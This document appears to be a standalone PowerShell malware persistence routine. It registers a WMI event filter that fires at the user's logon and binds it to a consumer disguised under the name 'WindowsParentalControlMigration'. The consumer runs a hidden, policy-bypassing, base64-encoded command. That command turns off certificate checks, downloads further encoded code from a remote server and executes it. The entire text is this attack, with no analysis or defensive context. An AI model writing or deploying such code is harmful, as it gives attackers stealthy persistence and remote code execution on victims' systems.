function wmi {
	
	$FilterArgs = @{name='WindowsParentalControlMigration';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like '%$($env:UserName)%'";}
	$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

	$ConsumerArgs = @{name='WindowsParentalControlMigration';
                CommandLineTemplate="powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADkAMAAwADEALwBzAHQAYQB0AHUAcwAvADkAOQA1ADUAOQA4ADUAMgAxADMANAAzADUANAAxADIANAA4AC8AcQB1AGUAcgB5AD0ALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA=";}
	$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

	$FilterToConsumerArgs = @{
		Filter = [Ref] $Filter
		Consumer = [Ref] $Consumer
	}
	$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
}